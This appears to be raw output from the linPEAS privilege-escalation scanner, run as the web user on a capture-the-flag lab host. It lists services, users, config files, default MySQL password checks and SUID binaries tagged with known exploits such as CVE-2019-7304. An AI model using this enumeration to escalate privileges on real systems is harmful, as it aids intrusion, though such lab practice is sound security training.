:1.10                          569 networkd-dispat root             :1.10         networkd-dispatcher.service -       -
:1.11                          671 unattended-upgr root             :1.11         unattended-upgrades.service -       -
:1.17                         7806 busctl          www-data         :1.17         apache2.service             -       -
:1.2                           426 systemd-network systemd-network  :1.2          systemd-networkd.service    -       -
:1.3                           573 systemd-logind  root             :1.3          systemd-logind.service      -       -
:1.4                           549 systemd-timesyn systemd-timesync :1.4          systemd-timesyncd.service   -       -
:1.5                           562 accounts-daemon[0m root             :1.5          accounts-daemon.service     -       -
:1.6                           571 polkitd         root             :1.6          polkit.service              -       -
:1.7                           574 udisksd         root             :1.7          udisks2.service             -       -
:1.9                           672 ModemManager    root             :1.9          ModemManager.service        -       -
com.ubuntu.LanguageSelector      - -               -                (activatable) -                           -       -
com.ubuntu.SoftwareProperties    - -               -                (activatable) -                           -       -
io.netplan.Netplan               - -               -                (activatable) -                           -       -
org.freedesktop.Accounts       562 accounts-daemon[0m root             :1.5          accounts-daemon.service     -       -
org.freedesktop.DBus             1 systemd         root             -             init.scope                  -       -
org.freedesktop.ModemManager1  672 ModemManager    root             :1.9          ModemManager.service        -       -
org.freedesktop.PackageKit       - -               -                (activatable) -                           -       -
org.freedesktop.PolicyKit1     571 polkitd         root             :1.6          polkit.service              -       -
org.freedesktop.UDisks2        574 udisksd         root             :1.7          udisks2.service             -       -
org.freedesktop.UPower           - -               -                (activatable) -                           -       -
org.freedesktop.bolt             - -               -                (activatable) -                           -       -
org.freedesktop.fwupd            - -               -                (activatable) -                           -       -
org.freedesktop.hostname1        - -               -                (activatable) -                           -       -
org.freedesktop.locale1          - -               -                (activatable) -                           -       -
org.freedesktop.login1         573 systemd-logind  root             :1.3          systemd-logind.service      -       -
org.freedesktop.network1       426 systemd-network systemd-network  :1.2          systemd-networkd.service    -       -
org.freedesktop.resolve1       548 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service    -       -
org.freedesktop.systemd1         1 systemd         root             :1.0          init.scope                  -       -
org.freedesktop.thermald         - -               -                (activatable) -                           -       -
org.freedesktop.timedate1        - -               -                (activatable) -                           -       -
org.freedesktop.timesync1      549 systemd-timesyn systemd-timesync :1.4          systemd-timesyncd.service   -       -
╔══════════╣ D-Bus config files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                                        
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)                                         



                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                            
                              ╚═════════════════════╝                                                                                                          
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                            
link-local 169.254.0.0
ens5: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.233.27  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::86:2bff:fe34:1781  prefixlen 64  scopeid 0x20<link>
        ether 02:86:2b:34:17:81  txqueuelen 1000  (Ethernet)
        RX packets 1638  bytes 1091548 (1.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1439  bytes 391054 (391.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 288  bytes 24908 (24.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 288  bytes 24908 (24.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Hostname, hosts and DNS
lookup                                                                                                                                                         
127.0.0.1 localhost
127.0.1.1 lookup lookup.thm files.lookup.thm

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0 trust-ad
search eu-west-1.compute.internal

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                              
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                             
                                                                                                                                                               


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                            
                               ╚═══════════════════╝                                                                                                           
╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users                                                                        
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                          

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                   
netpgpkeys Not Found
netpgp Not Found                                                                                                                                               
                                                                                                                                                               
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                
                                                                                                                                                               

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens                                                          
ptrace protection is enabled (1)                                                                                                                               

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2                                    
                                                                                                                                                               
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/usr/bin/bash                                                                                                                            

╔══════════╣ Users with console
root:x:0:0:root:/root:/usr/bin/bash                                                                                                                            
think:x:1000:1000:,,,:/home/think:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                         
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1000(think) gid=1000(think) groups=1000(think)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(tss) gid=111(tss) groups=111(tss)
uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
uid=109(landscape) gid=115(landscape) groups=115(landscape)
uid=110(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=111(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=112(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=113(fwupd-refresh) gid=117(fwupd-refresh) groups=117(fwupd-refresh)
uid=114(mysql) gid=119(mysql) groups=119(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=998(lxd) gid=100(users) groups=100(users)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)

╔══════════╣ Login now
 05:12:31 up 31 min,  0 users,  load average: 0.44, 0.11, 0.04                                                                                                 
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
think    tty1         Wed Jun 21 10:15:50 2023 - Wed Jun 21 08:26:43 2023  (-1:49)     0.0.0.0                                                                 
reboot   system boot  Wed Jun 21 10:15:13 2023 - Wed Jun 21 08:40:58 2023  (-1:34)     0.0.0.0
think    tty1         Fri Jun  2 09:59:11 2023 - Fri Jun  2 09:59:29 2023  (00:00)     0.0.0.0
reboot   system boot  Fri Jun  2 09:58:27 2023 - Fri Jun  2 09:59:36 2023  (00:01)     0.0.0.0
root     pts/0        Fri Jun  2 09:42:33 2023 - Fri Jun  2 09:57:32 2023  (00:14)     192.168.204.1
root     pts/1        Fri Jun  2 10:55:51 2023 - Fri Jun  2 10:56:47 2023  (00:00)     192.168.204.1
root     pts/0        Fri Jun  2 10:48:56 2023 - Fri Jun  2 11:05:07 2023  (00:16)     192.168.204.1
reboot   system boot  Fri Jun  2 10:48:18 2023 - Fri Jun  2 09:57:44 2023  (-00:50)    0.0.0.0

wtmp begins Fri Jun  2 10:48:18 2023

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                              
root             pts/0    192.168.14.1     Mon May 13 10:00:24 +0000 2024
think            pts/0    192.168.14.1     Sun May 12 12:07:25 +0000 2024

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
                                                                                                                                                               
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                               


100  820k  100  820k    0     0  22088      0  0:00:38  0:00:38 --:--:-- 18847
                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                             
                             ╚══════════════════════╝                                                                                                          
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                
/usr/bin/curl
/usr/bin/gcc
/usr/bin/nc
/usr/bin/netcat
/usr/bin/perl
/usr/bin/php
/usr/bin/ping
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  gcc                                   4:9.3.0-1ubuntu2                  amd64        GNU C compiler                                                        
ii  gcc-9                                 9.4.0-1ubuntu1~20.04.1            amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.41 (Ubuntu)                                                                                                         
Server built:   2023-03-08T17:32:54
httpd Not Found
                                                                                                                                                               
Nginx version: nginx Not Found
                                                                                                                                                               
/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.4.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.4.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.4.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Jan 11  2024 /etc/apache2/sites-enabled                                                                                            
drwxr-xr-x 2 root root 4096 Jan 11  2024 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Jul 30  2023 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 40 Jan 11  2024 /etc/apache2/sites-enabled/files.lookup.thm.conf -> ../sites-available/files.lookup.thm.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        ServerName files.lookup.thm
        DocumentRoot /var/www/files.lookup.thm/public_html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 34 Jan 11  2024 /etc/apache2/sites-enabled/lookup.thm.conf -> ../sites-available/lookup.thm.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        ServerName lookup.thm
        ServerAlias www.lookup.thm
        DocumentRoot /var/www/lookup.thm/public_html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 Jan 11  2024 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Jul 30  2023 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 72941 Jan 11  2024 /etc/php/7.4/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 72539 Jan 11  2024 /etc/php/7.4/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing MariaDB Files (limit 70)
                                                                                                                                                               
-rw------- 1 root root 317 Aug 15  2023 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Jan 11  2024 /usr/share/doc/rsync/examples/rsyncd.conf                                                                             
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Apr 17  2024 /etc/pam.d                                                                                                            
-rw-r--r-- 1 root root 2133 Jan 11  2024 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                           
drwxr-xr-x 2 root root 4096 Jan 11  2024 /etc/ldap


╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3787 Jan 11  2024 /etc/cloud/cloud.cfg                                                                                                  
     lock_passwd: True
-rw-r--r-- 1 root root 3787 May 19  2023 /snap/core20/1950/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3787 May 19  2023 /snap/core20/1974/etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 200 Jun 13  2023 /snap/core20/1950/usr/share/keyrings                                                                                   
drwxr-xr-x 2 root root 200 Jun 22  2023 /snap/core20/1974/usr/share/keyrings
drwxr-xr-x 2 root root 4096 Jan 11  2024 /usr/share/keyrings




╔══════════╣ Analyzing Cache Vi Files (limit 70)
                                                                                                                                                               
lrwxrwxrwx 1 root root 9 Jun 21  2023 /home/think/.viminfo -> /dev/null

╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 813 Feb  2  2020 /snap/core20/1950/usr/share/bash-completion/completions/postfix                                                        

-rw-r--r-- 1 root root 813 Feb  2  2020 /snap/core20/1974/usr/share/bash-completion/completions/postfix

-rw-r--r-- 1 root root 813 Jan 11  2024 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                                                               


-rw-r--r-- 1 root root 69 Jan 11  2024 /etc/php/7.4/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Jan 11  2024 /usr/share/php7.4-common/common/ftp.ini






╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 832 Jan 11  2024 /usr/share/bash-completion/completions/bind                                                                            
-rw-r--r-- 1 root root 832 Jan 11  2024 /usr/share/bash-completion/completions/bind




╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Jan 11  2024 /etc/skel/.bashrc                                                                                                     
-rwxr-xr-x 1 think think 3771 Jun  2  2023 /home/think/.bashrc
-rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1950/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1974/etc/skel/.bashrc





-rw-r--r-- 1 root root 807 Jan 11  2024 /etc/skel/.profile
-rwxr-xr-x 1 think think 807 Jun  2  2023 /home/think/.profile
-rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/1950/etc/skel/.profile
-rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/1974/etc/skel/.profile




╔══════════╣ Analyzing Windows Files (limit 70)
                                                                                                                                                               





















lrwxrwxrwx 1 root root 20 Jul 30  2023 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
lrwxrwxrwx 1 root root 24 Jul 30  2023 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 81 Jan 11  2024 /var/lib/dpkg/alternatives/my.cnf






























╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql                                                                                
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ MySQL version
mysql  Ver 8.0.34-0ubuntu0.20.04.1 for Linux on x86_64 ((Ubuntu))                                                                                              


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No                                                                                                     
═╣ MySQL connection using root/NOPASS ................. No                                                                                                     
                                                                                                                                                               
╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                   
gpg Not Found
netpgpkeys Not Found                                                                                                                                           
netpgp Not Found                                                                                                                                               
                                                                                                                                                               
-rw-r--r-- 1 root root 2796 Jan 11  2024 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Jan 11  2024 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Jan 11  2024 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /snap/core20/1950/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core20/1950/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core20/1950/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core20/1950/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /snap/core20/1950/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /snap/core20/1974/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core20/1974/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core20/1974/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core20/1974/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /snap/core20/1974/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 3267 Jan 11  2024 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 2247 Jan 11  2024 /usr/share/keyrings/ubuntu-advantage-cc-eal.gpg
-rw-r--r-- 1 root root 2274 Jan 11  2024 /usr/share/keyrings/ubuntu-advantage-cis.gpg
-rw-r--r-- 1 root root 2236 Jan 11  2024 /usr/share/keyrings/ubuntu-advantage-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Jan 11  2024 /usr/share/keyrings/ubuntu-advantage-esm-infra-trusty.gpg
-rw-r--r-- 1 root root 2275 Jan 11  2024 /usr/share/keyrings/ubuntu-advantage-fips.gpg
-rw-r--r-- 1 root root 2250 Jan 11  2024 /usr/share/keyrings/ubuntu-advantage-realtime-kernel.gpg
-rw-r--r-- 1 root root 2235 Jan 11  2024 /usr/share/keyrings/ubuntu-advantage-ros.gpg
-rw-r--r-- 1 root root 7399 Jan 11  2024 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Jan 11  2024 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Jan 11  2024 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 11  2024 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 Jan 11  2024 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Jan 11  2024 /usr/share/popularity-contest/debian-popcon.gpg
-rw-r--r-- 1 root root 2236 Jan 11  2024 /var/lib/ubuntu-advantage/apt-esm/etc/apt/trusted.gpg.d/ubuntu-advantage-esm-apps.gpg

drwx------ 3 think think 4096 Aug  9  2023 /home/think/.gnupg

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                 
passwd file: /etc/passwd
passwd file: /snap/core20/1950/etc/pam.d/passwd
passwd file: /snap/core20/1950/etc/passwd
passwd file: /snap/core20/1950/usr/share/bash-completion/completions/passwd
passwd file: /snap/core20/1950/usr/share/lintian/overrides/passwd
passwd file: /snap/core20/1950/var/lib/extrausers/passwd
passwd file: /snap/core20/1974/etc/pam.d/passwd
passwd file: /snap/core20/1974/etc/passwd
passwd file: /snap/core20/1974/usr/share/bash-completion/completions/passwd
passwd file: /snap/core20/1974/usr/share/lintian/overrides/passwd
passwd file: /snap/core20/1974/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                    
                                                                                                                                                               




-rw-r--r-- 1 root root 607 Jan 11  2024 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 179 Jan 11  2024 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 99 Jan 11  2024 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 571 Jan 11  2024 /etc/ssh/ssh_host_rsa_key.pub

ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
══╣ Some certificates were found (out limited):
/etc/pki/fwupd-metadata/LVFS-CA.pem                                                                                                                            
/etc/pki/fwupd/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068_2.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
1197PSTORAGE_CERTSBIN

══╣ Writable ssh and gpg agents
/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket                                                                                                
/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
/etc/systemd/user/sockets.target.wants/gpg-agent.socket
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                                                 
Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                               


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-shell-sessions                                                          
tmux 3.0a                                                                                                                                                      


/tmp/tmux-33



                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                             
                      ╚════════════════════════════════════╝                                                                                                   
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                
-rwsr-xr-x 1 root root 129K May 27  2023 /snap/snapd/19457/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                                                                                                                           
-rwsr-xr-x 1 root root 84K Nov 29  2022 /snap/core20/1950/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Nov 29  2022 /snap/core20/1950/usr/bin/chsh
-rwsr-xr-x 1 root root 87K Nov 29  2022 /snap/core20/1950/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K May 30  2023 /snap/core20/1950/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Nov 29  2022 /snap/core20/1950/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K Nov 29  2022 /snap/core20/1950/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                                                                       
-rwsr-xr-x 1 root root 67K May 30  2023 /snap/core20/1950/usr/bin/su
-rwsr-xr-x 1 root root 163K Apr  4  2023 /snap/core20/1950/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K May 30  2023 /snap/core20/1950/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root systemd-resolve 51K Oct 25  2022 /snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Apr  3  2023 /snap/core20/1950/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 84K Nov 29  2022 /snap/core20/1974/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Nov 29  2022 /snap/core20/1974/usr/bin/chsh
-rwsr-xr-x 1 root root 87K Nov 29  2022 /snap/core20/1974/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K May 30  2023 /snap/core20/1974/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Nov 29  2022 /snap/core20/1974/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K Nov 29  2022 /snap/core20/1974/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                                                                       
-rwsr-xr-x 1 root root 67K May 30  2023 /snap/core20/1974/usr/bin/su
-rwsr-xr-x 1 root root 163K Apr  4  2023 /snap/core20/1974/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K May 30  2023 /snap/core20/1974/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root systemd-resolve 51K Oct 25  2022 /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Apr  3  2023 /snap/core20/1974/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
